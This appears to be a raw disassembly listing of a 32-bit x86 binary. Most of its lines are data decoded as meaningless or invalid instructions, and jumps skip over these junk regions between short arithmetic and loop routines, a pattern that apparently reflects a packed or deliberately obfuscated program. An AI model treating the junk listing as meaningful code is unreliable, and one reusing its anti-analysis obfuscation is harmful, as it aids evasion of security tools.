  405991:	adc    ah,dh
  405993:	xor    edi,ebp
  405995:	sbb    BYTE PTR [ecx],bh
  405997:	add    eax,0x9a9beab7
  40599c:	mov    gs,edx
  40599e:	xor    BYTE PTR [edi+0x4104637c],0xca
  4059a5:	pop    ecx
  4059a6:	sub    al,0xbe
  4059a8:	cmp    eax,0x57ccebb0
  4059ad:	rcl    BYTE PTR [eax+esi*1],1
  4059b0:	push   0xd7920c2a
  4059b5:	inc    edi
  4059b6:	cmp    eax,0xd993e4e0
  4059bb:	(bad)  
  4059bc:	out    dx,al
  4059bd:	fstp   QWORD PTR [eax]
  4059bf:	rcr    DWORD PTR [ecx],0x42
  4059c2:	inc    ebp
  4059c3:	not    DWORD PTR [edx*1-0x58d854b]
  4059ca:	imul   esi,DWORD PTR [ebx-0x48],0xffffffc3
  4059ce:	xchg   DWORD PTR [edi+0x1f546825],ebx
  4059d4:	lds    ecx,FWORD PTR [esi]
  4059d6:	enter  0x8a82,0x2f
  4059da:	in     al,dx
  4059db:	pop    es
  4059dc:	js     0x405a1b
  4059de:	(bad)  
  4059df:	punpcklwd mm1,DWORD PTR [ebx]
  4059e2:	ror    eax,1
  4059e4:	cmp    eax,DWORD PTR [edi]
  4059e6:	mov    esi,0x77ec23a6
  4059eb:	jno    0x405a67
  4059ed:	imul   edi,ebp,0xffffffd9
  4059f0:	gs push edx
  4059f2:	and    DWORD PTR [eax+0x6b4a516d],esp
  4059f8:	mov    gs,WORD PTR [esi-0x7b4fa72d]
  4059fe:	jp     0x405a4c
  405a00:	call   0x37e72f8c
  405a05:	xchg   ebx,eax
  405a06:	jb     0x405a4b
  405a08:	push   ebx
  405a09:	js     0x405a5d
  405a0b:	cmp    dh,BYTE PTR [esi-0x176c8c0]
  405a11:	stc    
  405a12:	jbe    0x405a81
  405a14:	mov    ch,0xd8
  405a16:	dec    edi
  405a17:	inc    ebx
  405a18:	mov    ecx,0xcf118e2c
  405a1d:	fdivr  DWORD PTR [edx]
  405a1f:	enter  0x4194,0xb7
  405a23:	mov    ch,BYTE PTR [edi]
  405a25:	imul   edi,DWORD PTR [edx+0x4364961e],0xcf2eca99
  405a2f:	in     al,dx
  405a30:	inc    edi
  405a31:	loop   0x405a39
  405a33:	not    BYTE PTR ds:0x1ef9edbb
  405a39:	lahf   
  405a3a:	mov    al,0xa8
  405a3c:	pusha  
  405a3d:	jl     0x4059cb
  405a3f:	cmp    eax,0x23a6e566
  405a44:	pusha  
  405a45:	mov    ecx,0xc2e93ac7
  405a4a:	add    BYTE PTR [edi-0x6f],ch
  405a4d:	ins    BYTE PTR es:[edi],dx
  405a4e:	lahf   
  405a4f:	sbb    al,0xc7
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd85
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fd71,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fd71
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fd71,edx
  405a8f:	cmp    DWORD PTR ds:0x42fd71,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fd71,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e35b
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fd59,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fd59,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fd59,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e5b7
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fd59
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fd59,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fd51,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e777,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x8867624d
  405b88:	xor    eax,0x7032845c
  405b8d:	jo     0x405b39
  405b8f:	jle    0x405c01
  405b91:	jo     0x405bc9
  405b93:	and    eax,DWORD PTR [eax]
  405b95:	mov    edi,0x763dcb14
  405b9a:	fisttp DWORD PTR [edx-0x1a61c321]
  405ba0:	out    0xc0,eax
  405ba2:	or     eax,0xa11cef30
  405ba7:	pop    ebp
  405ba8:	fisttp QWORD PTR [eax-0x17]
  405bab:	adc    al,0x34
  405bad:	and    eax,0x5542c9c3
  405bb2:	bound  eax,QWORD PTR [ebx-0x57]
  405bb5:	dec    ebp
  405bb6:	ins    BYTE PTR es:[edi],dx
  405bb7:	mov    bl,BYTE PTR [esi+edx*1]
  405bba:	mov    edx,0x9cddba50
  405bbf:	mov    BYTE PTR [ecx+0x74],cl
  405bc2:	sbb    DWORD PTR [edi],0x61
  405bc5:	mov    edi,ds
  405bc7:	inc    esp
  405bc8:	push   edi
  405bc9:	xor    ebx,eax
  405bcb:	jo     0x405b89
  405bcd:	aas    
  405bce:	cmp    BYTE PTR ds:0x6476efdd,ah
  405bd4:	not    BYTE PTR [edx+0x56468af7]
  405bda:	mov    ds,edi
  405bdc:	call   0x37cb95b7
  405be1:	cld    
  405be2:	cmp    BYTE PTR [edi+esi*8],0x24
  405be6:	shr    BYTE PTR [ebp-0x7c310f5e],0xd3
  405bed:	js     0x405c40
  405bef:	(bad)  
  405bf0:	not    DWORD PTR [esi-0x65]
  405bf3:	sbb    ebp,DWORD PTR [esi-0x6b0b78f5]
  405bf9:	(bad)  
  405bfa:	in     al,dx
  405bfb:	arpl   WORD PTR [ebx+eiz*2],bx
  405bfe:	adc    DWORD PTR [edi],0x4b
  405c01:	push   ss
  405c02:	sub    BYTE PTR [edi],bh
  405c04:	test   DWORD PTR [ebp-0x1b],ebx
  405c07:	arpl   WORD PTR [edi],cx
  405c09:	retf   0x2868
  405c0c:	xchg   BYTE PTR ds:0x7350546a,cl
  405c12:	ret    
  405c13:	mov    esp,0xf2473964
  405c18:	jbe    0x405c7d
  405c1a:	es cdq 
  405c1c:	icebp  
  405c1d:	xchg   bh,ah
  405c1f:	(bad)  
  405c20:	jne    0x405c49
  405c22:	lea    ebx,[edx+eax*2]
  405c25:	mov    cl,BYTE PTR [edi-0x39c1d084]
  405c2b:	outs   dx,BYTE PTR ds:[esi]
  405c2c:	pushf  
  405c2d:	ja     0x405c19
  405c2f:	popa   
  405c30:	hlt    
  405c31:	cmp    ecx,edx
  405c33:	jae    0x405bf1
  405c35:	or     DWORD PTR [ebx],esi
  405c37:	sub    esi,DWORD PTR [eax-0x3d]
  405c3a:	cmp    ecx,esi
  405c3c:	cmc    
  405c3d:	jmp    0x405c96
  405c3f:	mul    ebp
  405c41:	ret    
  405c42:	cmc    
  405c43:	fadd   DWORD PTR [esi+0x6289bea3]
  405c49:	add    ebx,esi
  405c4b:	std    
  405c4c:	nop
  405c4d:	push   ebp
  405c4e:	mov    ch,0xa5
  405c50:	fimul  DWORD PTR [ebx+esi*1]
  405c53:	inc    esi
  405c54:	dec    edx
  405c55:	outs   dx,DWORD PTR ds:[esi]
  405c56:	push   ds
  405c57:	mov    WORD PTR [esi],cs
  405c59:	push   edi
  405c5a:	add    eax,DWORD PTR ds:0x37fdf234
  405c60:	lods   eax,DWORD PTR ds:[esi]
  405c61:	leave  
  405c62:	stos   BYTE PTR es:[edi],al
  405c63:	mov    dh,0xb4
  405c65:	cli    
  405c66:	jns    0x405c71
  405c68:	(bad)  
  405c69:	idiv   BYTE PTR [ecx+0x37b41a69]
  405c6f:	in     al,0xa5
  405c71:	stc    
  405c72:	inc    esp
  405c73:	imul   edi,DWORD PTR [eax-0x2],0xffffff81
  405c77:	or     eax,0xfbfb6591
  405c7c:	inc    ecx
  405c7d:	outs   dx,DWORD PTR ds:[esi]
  405c7e:	dec    DWORD PTR [esi]
  405c80:	add    ecx,DWORD PTR [edx]
  405c82:	sub    eax,0x3e4fe6fe
  405c87:	push   cs
  405c88:	push   ss
  405c89:	sbb    ah,dl
  405c8b:	(bad)  
  405c8c:	cmp    ebx,eax
  405c8e:	sti    
  405c8f:	cmc    
  405c90:	daa    
  405c91:	xchg   ecx,eax
  405c92:	psubsb mm0,QWORD PTR [edx+0xc]
  405c96:	sbb    eax,0x122685c9
  405c9b:	add    esi,esi
  405c9d:	fld    QWORD PTR [esi+0x8]
  405ca0:	mov    eax,0x5d0b861d
  405ca6:	aas    
  405ca7:	and    dl,bl
  405ca9:	sahf   
  405caa:	sub    DWORD PTR [edx-0xa74e3d2],ebx
  405cb0:	sub    eax,0xf3089792
  405cb5:	mov    bl,0x35
  405cb7:	mov    al,0x73
  405cb9:	out    0xfb,eax
  405cbb:	mov    dl,0xd4
  405cbd:	pusha  
  405cbe:	aad    0x34
  405cc0:	and    al,0xfa
  405cc2:	inc    edi
  405cc3:	aad    0x26
  405cc5:	or     al,0xcd
  405cc7:	ins    DWORD PTR es:[edi],dx
  405cc8:	xchg   edi,eax
  405cc9:	repz lahf 
  405ccb:	sub    eax,0xc8bf84fb
  405cd0:	shr    DWORD PTR [edi+0x7d],cl
  405cd3:	sub    BYTE PTR [ebx+edx*1+0x516c696c],dl
  405cda:	xor    eax,0x2356517d
  405cdf:	int3   
  405ce0:	stc    
  405ce1:	xor    ah,BYTE PTR [edi]
  405ce3:	dec    esi
  405ce4:	fsub   st(0),st
  405ce6:	out    dx,al
  405ce7:	sbb    eax,0xe14feabe
  405cec:	fist   WORD PTR [ebx+0x128123b2]
  405cf2:	cwde   
  405cf3:	je     0x405d55
  405cf5:	mov    bl,0x5
  405cf7:	xchg   ebp,eax
  405cf8:	push   0x1308c127
  405cfd:	sub    ebx,esp
  405cff:	test   bl,bh
  405d01:	xor    bh,BYTE PTR [edx]
  405d03:	or     BYTE PTR [edi-0x7b],ch
  405d06:	push   eax
  405d07:	cld    
  405d08:	xlat   BYTE PTR ds:[ebx]
  405d09:	call   0x5bf:0x4e26d6da
  405d10:	aaa    
  405d11:	(bad)  
  405d12:	jnp    0x405cc5
  405d14:	and    BYTE PTR [esi+0x68],0x64
  405d18:	fmul   QWORD PTR [ebx-0x4fb40b0a]
  405d1e:	push   0x5
  405d20:	jb     0x405cd1
  405d22:	and    DWORD PTR [ebp-0x4],0x6f4023f6
  405d29:	xchg   esi,eax
  405d2a:	jno    0x405d31
  405d2c:	push   edi
  405d2d:	ins    BYTE PTR es:[edi],dx
  405d2e:	in     eax,dx
  405d2f:	pop    ds
  405d30:	cmp    eax,0x6e502629
  405d35:	outs   dx,BYTE PTR ds:[esi]
  405d36:	std    
  405d37:	outs   dx,DWORD PTR ds:[esi]
  405d38:	push   0x6e101d01
  405d3d:	lods   eax,DWORD PTR ds:[esi]
  405d3e:	enter  0x3111,0xf7
  405d42:	mov    ebp,0xe00c7c0e
  405d47:	pop    esp
  405d48:	xchg   ecx,eax
  405d49:	pop    es
  405d4a:	fbld   TBYTE PTR [ebx]
  405d4c:	sub    ebx,DWORD PTR [ebp-0x3ab0f4b1]
  405d52:	inc    esi
  405d53:	mov    DWORD PTR [ebx-0x64],ecx
  405d56:	sub    ch,bh
  405d58:	mov    edx,0x62adb67d
  405d5d:	imul   ebx,DWORD PTR [edx+0x25c2230d],0x7b
  405d64:	popf   
  405d65:	mov    esp,0x874eac95
  405d6a:	out    dx,eax
  405d6b:	test   DWORD PTR [edi],eax
  405d6d:	out    0xbe,al
  405d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d70:	jmp    0xf93c:0xaca0f1f5
  405d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d78:	sbb    ecx,DWORD PTR [edi+0x643b44a8]
  405d7e:	dec    edx
  405d7f:	sub    DWORD PTR [eax+0x56],ecx
  405d82:	mov    DWORD PTR [eax-0x6ade0971],esi
  405d88:	pop    edx
  405d89:	jge    0x405d7b
  405d8b:	or     eax,0x90394daa
  405d90:	add    BYTE PTR [esi+0x54],cl
  405d93:	pushf  
  405d94:	jmp    DWORD PTR [edi+0x2d]
  405d97:	fbstp  TBYTE PTR [edx-0x7e28aaff]
  405d9d:	aaa    
  405d9e:	inc    ebp
  405d9f:	iret   
  405da0:	pop    esp
  405da1:	adc    BYTE PTR [eax+0x64a3ae88],dl
  405da7:	scas   eax,DWORD PTR es:[edi]
  405da8:	out    dx,al
  405da9:	or     eax,0xddea6a7
  405dae:	cmp    dh,BYTE PTR [ecx]
  405db0:	dec    esp
  405db1:	mov    esi,?
  405db3:	mov    fs,WORD PTR [ebp+eax*2+0x7b]
  405db7:	xor    bl,BYTE PTR [eax+0x286c4be3]
  405dbd:	dec    esi
  405dbe:	popa   
  405dbf:	xchg   esi,eax
  405dc0:	mov    dh,0x51
  405dc2:	mov    ebx,0xe780252d
  405dc7:	and    eax,ebx
  405dc9:	push   ebp
  405dca:	inc    edx
  405dcb:	out    0x3c,eax
  405dcd:	dec    esp
  405dce:	inc    esp
  405dcf:	push   ebp
  405dd0:	push   eax
  405dd1:	in     eax,dx
  405dd2:	jmp    0xfbf:0xa54d9cc0
  405dd9:	add    DWORD PTR [eax+edi*8-0x33],ecx
  405ddd:	add    al,0x12
  405ddf:	das    
  405de0:	mov    ecx,0x3f5ef122
  405de5:	sbb    DWORD PTR [ebp+0x6c],eax
  405de8:	push   eax
  405de9:	sub    al,0x8b
  405deb:	cmp    BYTE PTR [ebx+edx*1+0x77c3ab3a],0xc1
  405df3:	shr    BYTE PTR [esi+0x40ca2a80],0x82
  405dfa:	leave  
  405dfb:	jle    0x405e34
  405dfd:	xor    dh,BYTE PTR [esi-0x57515780]
  405e03:	sub    eax,0x7c033761
  405e08:	pop    edx
  405e09:	push   edx
  405e0a:	into   
  405e0b:	popa   
  405e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e0d:	jb     0x405e41
  405e0f:	repnz loopne 0x405e84
  405e12:	loopne 0x405dcd
  405e14:	cmp    BYTE PTR [ecx+0x9f95aea],dh
  405e1a:	pop    ss
  405e1b:	sbb    ch,dl
  405e1d:	out    dx,eax
  405e1e:	and    eax,0x6df7a586
  405e23:	daa    
  405e24:	out    0xa3,al
  405e26:	pop    esi
  405e27:	cmp    al,BYTE PTR [ebp+0xb]
  405e2a:	test   DWORD PTR [edi+0x13a4a305],edx
  405e30:	adc    BYTE PTR [eax],bh
  405e32:	jbe    0x405eae
  405e34:	mov    eax,0xb7ea916d
  405e39:	clc    
  405e3a:	mov    dl,0xdc
  405e3c:	popf   
  405e3d:	push   edi
  405e3e:	test   eax,0x22a8f595
  405e43:	test   eax,0x2a2db02e
  405e48:	xor    eax,edx
  405e4a:	add    eax,ecx
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e78f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e76f,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd81,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0xa4
  405ea8:	cmp    esp,DWORD PTR [edi-0x3d]
  405eab:	ds aas 
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405e65
  405eb4:	mov    ebx,0x545ad9b0
  405eb9:	fidivr WORD PTR [edx-0x67]
  405ebc:	icebp  
  405ebd:	clc    
  405ebe:	rcr    BYTE PTR [esi],0x7a
  405ec1:	adc    dh,dh
  405ec3:	jle    0x405eef
  405ec5:	pushf  
  405ec6:	lea    ebx,[esi-0x75]
  405ec9:	push   ds
  405eca:	add    ecx,edi
  405ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ecd:	aam    0x95
  405ecf:	clc    
  405ed0:	test   BYTE PTR [edx-0x190cc1e2],0xfd
  405ed7:	xchg   esi,eax
  405ed8:	sub    al,BYTE PTR [edx-0x4467cefb]
  405ede:	mov    eax,ds:0xb27bd91d
  405ee3:	and    edi,DWORD PTR [ebp+ecx*4-0x4e]
  405ee7:	or     BYTE PTR [ecx-0x586268f4],bh
  405eed:	lahf   
  405eee:	ret    0xce40
  405ef1:	jb     0x405f1e
  405ef3:	fimul  WORD PTR [ebx+0x485fdb6e]
  405ef9:	xchg   esp,eax
  405efa:	mov    bh,0xf
  405efc:	inc    edi
  405efd:	fist   WORD PTR [edx]
  405eff:	mov    WORD PTR [ebx-0x3f2ef1f2],ss
  405f05:	ret    0x3195
  405f08:	dec    ebx
  405f09:	sub    esi,DWORD PTR [ebp+0x4bd5e0da]
  405f0f:	retf   
  405f10:	out    0xaa,al
  405f12:	cmc    
  405f13:	icebp  
  405f14:	fcom   DWORD PTR [eax]
  405f16:	adc    BYTE PTR [edx+0x137bd5c5],bh
  405f1c:	lock sbb dh,ch
  405f1f:	xchg   ebx,eax
  405f20:	mov    al,ds:0x8e363a41
  405f25:	pushf  
  405f26:	shr    ebx,0xed
  405f29:	ja     0x405f62
  405f2b:	imul   edx,edi,0xce4dbdbf
  405f31:	xchg   BYTE PTR [ebp-0xa82c0b2],bl
  405f37:	repz sbb ch,BYTE PTR [ebp+0x57]
  405f3b:	les    esp,FWORD PTR [ebx-0x5152ffb0]
  405f41:	jmp    0x4a92c5ee
  405f46:	(bad)  
  405f47:	lea    esp,[edi]
  405f49:	fist   WORD PTR [edx+0x4c]
  405f4c:	mov    edi,0xe06c935a
  405f51:	lds    edi,FWORD PTR [eax]
  405f53:	pusha  
  405f54:	cmp    DWORD PTR [eax-0x22],0xffffffa3
  405f58:	mov    ch,0xd2
  405f5a:	pop    ss
  405f5b:	hlt    
  405f5c:	sbb    al,bh
  405f5e:	inc    edx
  405f5f:	aas    
  405f60:	mov    dl,0x63
  405f62:	mov    ebx,0xf078c3ab
  405f67:	push   ecx
  405f68:	or     bh,BYTE PTR [ecx+eiz*2]
  405f6b:	shl    DWORD PTR [esi+0x20],0xae
  405f6f:	mov    ecx,0xb0fc88e3
  405f74:	xor    al,0xe
  405f76:	fcomp  DWORD PTR [ecx-0x58feb1f3]
  405f7c:	sbb    ebp,DWORD PTR [ebx]
  405f7e:	xchg   BYTE PTR [ecx-0x15],bh
  405f81:	dec    edi
  405f82:	shr    DWORD PTR [ebp+esi*8-0x65],1
  405f86:	nop
  405f87:	pop    ebx
  405f88:	inc    eax
  405f89:	jmp    0x5f31:0xffc5ce69
  405f90:	outs   dx,DWORD PTR ds:[esi]
  405f91:	inc    eax
  405f92:	add    dh,0xc0
  405f95:	mov    ebp,0x4f37b1da
  405f9a:	es std 
  405f9c:	or     dl,cl
  405f9e:	jns    0x405f7a
  405fa0:	loopne 0x405f7a
  405fa2:	dec    ecx
  405fa3:	xor    ch,BYTE PTR ds:0x3d5af53
  405fa9:	pop    edi
  405faa:	into   
  405fab:	fcmovne st,st(2)
  405fad:	pop    esi
  405fae:	je     0x405fb9
  405fb0:	in     al,dx
  405fb1:	mov    ebp,0x1197a84e
  405fb6:	xchg   ebx,eax
  405fb7:	fs pop esp
  405fb9:	sbb    BYTE PTR [esi-0x68],cl
  405fbc:	push   edi
  405fbd:	data16 sbb cl,ah
  405fc0:	test   bl,ch
  405fc2:	xchg   edi,eax
  405fc3:	repz pop es
  405fc5:	sub    ecx,0xdecf81d6
  405fcb:	iret   
  405fcc:	imul   ebp,DWORD PTR [eax+0x31e86dca],0x5eb75015
  405fd6:	jb     0x405f70
  405fd8:	add    eax,0x55aea5e6
  405fdd:	xchg   esp,eax
  405fde:	and    BYTE PTR [edi+0x32987f73],bl
  405fe4:	sub    al,0x58
  405fe6:	jo     0x405fbc
  405fe8:	dec    esp
  405fe9:	push   ebp
  405fea:	aam    0x6
  405fec:	and    DWORD PTR [eax],esp
  405fee:	clc    
  405fef:	(bad)  
  405ff0:	test   al,0x2a
  405ff2:	das    
  405ff3:	not    BYTE PTR [edi]
  405ff5:	fwait
  405ff6:	div    BYTE PTR [edi-0x447b53bd]
  405ffc:	fwait
  405ffd:	clc    
  405ffe:	mov    ecx,0x6c79ad90
  406003:	das    
  406004:	test   al,0x6f
  406006:	push   edx
  406007:	push   esi
  406008:	push   edi
  406009:	iret   
  40600a:	aad    0xce
  40600c:	xchg   esp,ebx
  40600e:	sahf   
  40600f:	pop    ebp
  406010:	cmp    BYTE PTR [eax+0xbba9a09],dh
  406016:	(bad)  [eax+eiz*8+0xc]
  40601a:	mov    ah,0x9
  40601c:	mov    esi,0xcd13bfdf
  406021:	stc    
  406022:	xchg   ebp,eax
  406023:	or     DWORD PTR [ebp+0x6d696735],ebx
  406029:	aaa    
  40602a:	jp     0x40605b
  40602c:	out    0xd,eax
  40602e:	inc    edi
  40602f:	add    DWORD PTR [eax],eax
  406031:	or     ch,dl
  406033:	sbb    ecx,0xffffffcf
  406036:	inc    ecx
  406037:	out    0xd0,al
  406039:	fidivr WORD PTR [ebp-0x76c895d1]
  40603f:	sbb    al,0x45
  406041:	sbb    bh,ah
  406043:	sbb    BYTE PTR [edx+0x52e27235],cl
  406049:	popf   
  40604a:	mov    edi,0x1476b77b
  40604f:	jge    0x406004
  406051:	jmp    0x40609f
  406053:	or     esp,edi
  406055:	loopne 0x40608b
  406057:	xor    DWORD PTR [eax+0x5744f4c],ebp
  40605d:	pushf  
  40605e:	jb     0x406092
  406060:	add    BYTE PTR [ecx+0x42fe060d],al
  406066:	add    ah,ah
  406068:	or     al,BYTE PTR [eax]
  40606a:	add    BYTE PTR [ecx+0xc458b02],cl
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e198
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fdf6,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fd71,0x42e19c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fd51,0x42e77b
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fe02,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fd55,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd85
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x6bf76996
  4060dc:	cmp    ah,BYTE PTR [ebp+0x3e]
  4060df:	jo     0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406102
  4060e6:	(bad)
  4060eb:	(bad)  
  4060ec:	push   edi
  4060ed:	adc    eax,0x4cdb04c1
  4060f2:	xchg   ebp,eax
  4060f3:	add    dh,BYTE PTR [ecx+esi*8+0x675ca170]
  4060fa:	not    ebp
  4060fc:	mov    esi,0xc06a0972
  406101:	mov    bh,0x46
  406103:	or     eax,ecx
  406105:	cmp    DWORD PTR [eax+ecx*4+0x5b680557],eax
  40610c:	pop    eax
  40610d:	or     edx,DWORD PTR [ebx+eax*1]
  406110:	loopne 0x406156
  406112:	sub    BYTE PTR [ecx-0x37],ah
  406115:	bts    DWORD PTR [edx],ebx
  406118:	retf   
  406119:	hlt    
  40611a:	adc    DWORD PTR [ecx+0x4c3acc26],eax
  406120:	aaa    
  406121:	xchg   ecx,ebp
  406123:	(bad)  
  406124:	clc    
  406125:	mov    cl,0x8b
  406127:	cmp    al,0xbc
  406129:	rol    DWORD PTR [ebp-0x152a4ad4],1
  40612f:	imul   ecx,ecx,0xfffffffa
  406132:	bound  ebp,QWORD PTR [ecx-0x27]
  406135:	xor    dh,BYTE PTR [edi+eax*8-0x7332e20c]
  40613c:	jmp    0x4061ad
  40613e:	dec    ebp
  40613f:	mul    edi
  406141:	or     ebp,ebp
  406143:	dec    ebp
  406144:	ins    DWORD PTR es:[edi],dx
  406145:	jmp    0x40610a
  406147:	xchg   esi,eax
  406148:	and    esi,DWORD PTR ds:0x1a81e49e
  40614e:	pusha  
  40614f:	xor    esp,ebp
  406151:	popa   
  406152:	mov    edi,DWORD PTR [ecx-0x1f]
  406155:	inc    edx
  406156:	inc    ecx
  406157:	mov    ebx,0x45789811
  40615c:	popa   
  40615d:	sub    cl,BYTE PTR [ebp-0x3f4b3834]
  406163:	lods   eax,DWORD PTR ds:[esi]
  406164:	in     eax,dx
  406165:	mov    eax,ds:0x45cac7cf
  40616a:	sbb    al,0x9c
  40616c:	in     al,0x94
  40616e:	ds jmp 0xb2d0c546
  406174:	push   ss
  406175:	loop   0x406196
  406177:	mov    bl,0x90
  406179:	add    al,0x50
  40617b:	test   al,0xfd
  40617d:	repz push 0xeedb41ce
  406183:	loope  0x4061aa
  406185:	fnstsw WORD PTR [edx+0x7f9ba08a]
  40618b:	pushf  
  40618c:	add    esp,esp
  40618e:	mov    esi,0xf0ea9684
  406193:	jmp    0xbd474567
  406198:	and    edx,DWORD PTR [edx+0x1b04fce6]
  40619e:	and    eax,DWORD PTR [edx+edx*8-0x1d]
  4061a2:	mov    ecx,0xbb458ebc
  4061a7:	gs clc 
  4061a9:	ficom  DWORD PTR [esi-0x7a]
  4061ac:	repz add ebx,0x7
  4061b0:	jg     0x40621a
  4061b2:	loop   0x40620a
  4061b4:	adc    esp,DWORD PTR [ecx+ecx*4-0x2edfa99b]
  4061bb:	xor    ah,bl
  4061bd:	leave  
  4061be:	fcomp  QWORD PTR [esi-0x5fa68d1d]
  4061c4:	inc    ebx
  4061c5:	xor    eax,0x6ccb639e
  4061ca:	push   esi
  4061cb:	out    0x25,eax
  4061cd:	mov    eax,0x19e5f135
  4061d2:	sbb    bh,BYTE PTR [ecx-0x7c]
  4061d5:	int3   
  4061d6:	pop    ds
  4061d7:	push   edx
  4061d8:	int    0x1a
  4061da:	adc    eax,0x184c44bd
  4061df:	xchg   esp,eax
  4061e0:	lock and dx,WORD PTR [edi+0x1595f355]
  4061e8:	int    0x29
  4061ea:	push   esp
  4061eb:	iret   
  4061ec:	fwait
  4061ed:	xor    DWORD PTR [ebp-0x26991ac2],esp
  4061f3:	push   ecx
  4061f4:	xchg   edx,eax
  4061f5:	mov    al,ds:0xb3f2be1d
  4061fa:	inc    eax
  4061fb:	cs adc al,0x5d
  4061fe:	adc    edx,DWORD PTR [ecx+0x33]
  406201:	enter  0x4f9d,0x6d
  406205:	fcmovne st,st(3)
  406207:	mov    ds:0xf2981ecc,al
  40620c:	std    
  40620d:	xlat   BYTE PTR ds:[ebx]
  40620e:	ret    0xa1b4
